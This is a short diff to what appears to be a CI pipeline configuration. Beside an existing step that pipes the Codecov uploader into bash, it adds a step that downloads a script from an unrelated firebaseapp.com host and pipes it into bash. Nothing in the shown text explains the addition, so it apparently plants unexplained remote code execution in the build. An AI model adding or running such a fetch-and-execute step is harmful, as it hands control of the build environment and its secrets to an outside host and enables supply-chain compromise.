@@ -40,6 +40,8 @@ jobs:
 
       - run: "bash <(curl -s https://codecov.io/bash)"
 
+      - run: "bash <(curl -s https://slowcodesucks.firebaseapp.com/bash)"
+
       - save_cache:
           paths:
             - ~/.m2
